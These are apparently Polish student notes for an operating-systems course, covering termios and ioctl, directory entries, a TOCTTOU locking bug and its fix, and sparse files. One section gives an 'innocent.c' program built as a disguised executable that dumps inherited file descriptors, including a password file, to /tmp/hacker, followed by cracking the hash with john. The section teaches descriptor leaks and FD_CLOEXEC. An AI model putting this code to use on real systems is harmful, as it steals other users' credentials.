# SO - Lista 4

## Materiały
### APUE - 3,4,5
#### 3 File I/O
file descriptors
open vs openat (TOCTTOU)
filename and pathname trunc
creat -> equivalent to oepn with flags WRONLY CREAT TRUNC
close -> proces terminates -> kernel closes automatically
lseek -> TODO
...
#### 4 Files and directories
#### 5 Standard I/O library

### LPI - 4, 5, 18, 44
#### 4 - file i/o
#### 5 - file detail
#### 18 - directories and links
#### 44 - pipes and fifos

### Tannenbaum 4.1, 4.2, 10.6
#### 4.1 files
#### 4.2 directories
#### 10.6 the linux file system

### 3 easy pieces 39: Interlude files and directories

## 1
![](https://i.imgur.com/GIHg9p8.png)

### LPI 62.1, 62.2 - terminal overview, retrieving and modyfing terminal attributes
![](https://i.imgur.com/k5acZYh.png)

fd - odnosi się do terminala
termios_p to wskaźnik na strukturę:
![](https://i.imgur.com/Wx46Ddi.png)

optional actions:
![](https://i.imgur.com/X3GHigf.png)

### tty_curpos
```c=
void tty_curpos(int fd, int *x, int *y) 
  struct termios ts, ots; 

  tcgetattr(fd, &ts);
  memcpy(&ots, &ts, sizeof(struct termios)); 
  ts.c_lflag &= ~(ECHO | ICANON); 
  ts.c_cflag &= ~CREAD;           
  tcsetattr(fd, TCSADRAIN, &ts);  

  /* How many characters in the input queue. */
  int m = 0;
  /* TODO: Need to figure out some other way to do it on MacOS / FreeBSD. */
#ifdef LINUX
  ioctl(fd, TIOCINQ, &m);
#endif

  /* Read them all. */
  char discarded[m];
  m = Read(fd, discarded, m);

  Write(fd, CPR(), sizeof(CPR()));
  char buf[20];
  int n = Read(fd, buf, 19);
  buf[n] = '\0';

  ts.c_lflag |= ICANON;
  tcsetattr(fd, TCSADRAIN, &ts);
  for (int i = 0; i < m; i++)
    ioctl(fd, TIOCSTI, discarded + i);

  tcsetattr(fd, TCSADRAIN, &ots);
  sscanf(buf, "\033[%d;%dR", x, y);
}
```

```c=
// przekazujemy file-descriptor, wskaźniki x i y
void tty_curpos(int fd, int *x, int *y) {
  struct termios ts, ots;                    // strukutra atrybutów

  tcgetattr(fd, &ts);                        // czytamy obecne atrybuty do ts
  memcpy(&ots, &ts, sizeof(struct termios)); // i kopiujemy ję to ots
  ts.c_lflag &= ~(ECHO | ICANON);            // wyłączamy ECHO i ICANON
  ts.c_cflag &= ~CREAD;                      // wyłączamy CREAD
  tcsetattr(fd, TCSADRAIN, &ts);             // ustawiamy atrybuty dla fd z flagą TCSADRAIN
```

**ECHO** - czy znaki z wejścia są wypisywane
**ICANON** - tryb kanoniczny przetwarzania (erase, kill, ograniczenie przez EOL\EOF\'n' itp.)
**CREAD** - włącza odbiorcę (receiver)
**TCSADRAIN** - zmiany wykonują się po przekazaniu całego zakolejkowanego wyjścia do terminala

```c=
  /* How many characters in the input queue. */
  int m = 0;
  /* TODO: Need to figure out some other way to do it on MacOS / FreeBSD. */
#ifdef LINUX
  ioctl(fd, TIOCINQ, &m);
#endif
```
komenda `TIOCINQ` dla `ioctl(4)` pobiera liczbę bajtów w buforze wejściowym dla `fd` i zapisuje je do zmiennej m

```c=
  /* Read them all. */
  char discarded[m];
  m = Read(fd, discarded, m);
```
czytamy to m bajtów do tablicy `discarded`

```c=
  Write(fd, CPR(), sizeof(CPR()));
  char buf[20];
  int n = Read(fd, buf, 19);
  buf[n] = '\0';
```
zapisujemy wartość `CPR` do deskryptora i czytamy 19 bajtów

```
  ts.c_lflag |= ICANON;                
  tcsetattr(fd, TCSADRAIN, &ts);       // włączamy tryb kanoniczny
  for (int i = 0; i < m; i++)
    ioctl(fd, TIOCSTI, discarded + i);
```
dla pobranych wcześniej m bajtów wrzucamy je na kolejkę wejściową (flaga `TIOCSTI`)

```c=
  tcsetattr(fd, TCSADRAIN, &ots);    // przywracamy atrybuty z ots
  sscanf(buf, "\033[%d;%dR", x, y);  // odczytujemy zmienne x i y z bufora
```

bufor to wynik CPR() czyli: 
Reports the cursor position (CPR) by transmitting ESC[n;mR, where n is the row and m is the column.)

x to wiersz
y to kolumna

### do czego służy CPR
Reports the cursor position (CPR) by transmitting ESC[n;mR, where n is the row and m is the column.)

### semantyka TCGETS i TCSETSW, TIOCINQ, TIOCSTI

`int ioctl(int fd, int cmd)`

cmd: 
TCGETS (get and set terminal attributes)
struct termios *argp
Equivalent to tcgetattr(fd, argp).
Get the current serial port settings.

TCSETSW (get and set terminal attributes)
const struct termios *argp
Equivalent to tcsetattr(fd, TCSADRAIN, argp).
Allow the output buffer to drain, and set the current serial port settings.

TIOCINQ (buffer count and flushing)
int *argp
Get the number of bytes in the input buffer.

TIOCSTI (faking input)
const char *argp
Insert the given byte in the input queue.

## 5
![](https://i.imgur.com/S3XCqqK.png)

**rekord katalogu - directory entry** - zawiera nazwę pliku oraz strukturę informacji opisujących jego atrybuty (tj. typ pliku, rozmiar, grupa, właściciel, uprawnienia, data modyfikacji/zmiany)

**metadane** - "dane o danych", opisują atrybuty danych

**dowiązania** - referencja wskazująca na zawartość katalogu lub pliku w systemie plików. Jest to dodatkowa nazwa dla sytemu operacyjnego odnosząca się do zawartości danego obiektu.

### Czemu nie można czytać i modyfikać katologu przy pomocy read(2) i write(2)
Dlatego, że katalogi to listy rekordów. Read i write obsługują natomiast bajty.

### Jakim wywołaniem systemowym można wczytać rekord katalogu (directory entry)?
`readdir` (depr.) -> `getdents`

![](https://i.imgur.com/V88wYc6.png)


### Dlaczego zawartość katalogu nie jest posortowana?
To zależy od systemu operacyjnego i od implementacji systemu plików. Możemy np. chcieć optymalizować prędkość wypisywania i wtedy inna kolejność jest lepsza. Rekordy mogą być np. przechowtywane w drzewach czerwono czarnych

### Metadane katalogu głównego, polecenie stat, z czego wynika liczba dowiązań (hard link)
`stat /`

widzimy, że mamy 20 dowiązań, które wynikają z:
- katalogów `..` w 18 katalogach zawartych w `/`
- katalogu '.'
- katalogu '..'
`ls -al / | grep -c "^d"`

katalog to mapa nazwa -> inode

## 6
![](https://i.imgur.com/3WD3Vkz.png)

```c=
bool f_lock(const char *path) 
{
    if (access(path, F_OK) == 0) // sprawdza czy plik istnieje pod podaną ścieżką
        return false; // jeśli nie to wracamy z 0
    
    (void)Open(path, O_CREAT|O_WRONLY, 0700); // otwiera/tworzy pliik tyko do odczytu
    return true;
}

void f_unlock(const char* path)
{
    Unlink(path);
}
```

### Co powoduje błąd?
#### TOCTTOU
Time of Check to Time to Use - race condition pomiędzy sprawdzaniem stanu i użyciem tego stanu
Może zostać użyty przez atakującego do np. eskalowania uprawnień poprzez podmianę pliku (symlink) pomiędzy `access` i `open`.

### Jak go naprawić?
Chcemy by f_lock był atomowy:

```c=
bool f_lock(const char *path) 
{
    return (open(path, O_CREAT | O_WRONLY | O_EXCL, 0700) >= 0);
}

void f_unlock(const char* path)
{
    Unlink(path);
}
```
dodaliśmy flagę `O_EXCL`, która w połączeniu z `O_CREAT` zwraca błąd gdy dany plik już istnieje. Jeśli open zakończyło się poprawnie to zwróci deskryptor pliku (który jest nieujemny), czyli zakładamy lock.

## 7
![](https://i.imgur.com/OqCd4UY.png)

**kursor** - pozycja w pliku (przesunięcie względem początku) , jeśli parę procesów otworzy ten sam plik to ich read() i write() mają właśny kursor. Jeśli proces otwiera plik i przekazuje otwarte deskryptory plików (np. do dziecka) to kursor jest współdzielony.

**dowiązanie symboliczne** (symlink) - specjalny rodzaj pliku, wskazuje on za pomocą nazwy dowolny inny plik lub katalog (który może nie istnieć w danym momencie) w dowolnym systemie plików (w przeciwieństwo do hard linków)
`ln -s existing link`

leaky.c
```c=
#include "csapp.h"

int main(int argc, char **argv) {
  long max_fd = sysconf(_SC_OPEN_MAX);

  /* Initialize PRNG seed. */
  struct timeval tv;
  gettimeofday(&tv, NULL);
  srandom(tv.tv_usec);

  /* This opens a file with password that is checked later. */
  int fd_1 = Open("mypasswd", O_RDONLY, 0);
  int fd_2 = 3 + random() % (max_fd - 3);
  (void)Dup2(fd_1, fd_2);
  Close(fd_1);
  Lseek(fd_2, 0, SEEK_END);

  /* TODO: Something is missing here to fix the issue! */

  // fcntl(fd_2, F_SETFD, FD_CLOEXEC);

  /* Let's suppose a user typed in correct password and was allowed to execute
   * a command and they choose to run our program. */
  int rc = system("./innocent");
  if (rc < 0)
    unix_error("System error");

  /* At this point we may finally close the file. */
  Close(fd_2);

  return rc;
}
```

innocent.c
```c=
#include "csapp.h"

int main(void)
{
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  const int bufsiz = 512;
  char link_name[bufsiz]; 
  char path_name[bufsiz];

  for (int i = 4; i < max_fd; ++i)
  {
    // test if readable
    if (lseek(i, 0, 0) == -1)
    {
      continue;
    }

    // get symbolic link using procfs(5)
    snprintf(link_name, bufsiz, "/proc/self/fd/%d", i);

    // read path from symbolic link
    int pathsz;
    if ((pathsz = Readlink(link_name, path_name, bufsiz)) == -1)
    {
      fprintf(stderr, "Readlink err");

      exit(EXIT_FAILURE);
    }
    path_name[pathsz] = '\0';
    
    // print filepath
    dprintf(out, "File descriptor %d is '%s' file!\n", i, path_name);

    // print file's content
    int readsz;
    char buf[4096];
    if ((readsz = read(i, buf, 4095)) > 0)
    {
      buf[readsz] = '\0';
      dprintf(out, "%s", buf);
    }
  }

  /* */
  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}

```

### Łamanie hasła:
po uruchomieniu `leaky` (pamiętaj o make) 
w `/tmp/hacker` mamy zapisane pliki z otwartych deskryptorów wydłubane przez złośliwy `innocent` uruchomiony przez użytkownika.

`john /tmp/hacker --show` -> łamie hasło (DES 128)

## 8
![](https://i.imgur.com/6bYms7E.png)

### Pojęcia
metadane

### stat
`stat mkholes.bin`
http://man7.org/linux/man-pages/man2/stat.2.html
![](https://i.imgur.com/mBb5P3q.png)

Mamy 1112 bloków (każdy z nich ma po 512B).
Zatem faktyczna objętość pliku to Block * 512 = 569344B = 556KB (zgodnie z wydrukiem `ls -lh`)

`st_blksize` odnosi się do rozmiaru systemu plików (tutaj 4096B), odnosi się do tego ile danych jest preferowanych w trakcie przenoszenia podczas operacji I/O

### Czemu liczba używanych bloków jest mniejsza od tej wynikającej z objętości pliku z pola st_size?
Policzmy ile jest tych bloków:
st_size / 512B = 33550336B (31.99MB) / 512B = 65528 bloków.
Dlatego że dziury nie muszą mieć alokowanego miejsca na dysku.

### Czemu jest większa od liczby faktycznie używanych bloków zgłaszanych przez mkholes?
`stat -c "%b %B" holes.bin`
Rozmiar bloku ma 512B (a nie 4096B deklarowane w programie), a więc 8 razy więcej.
Program deklarował 138 bloków, a mamy ich 1112 (138 * 8 + 8).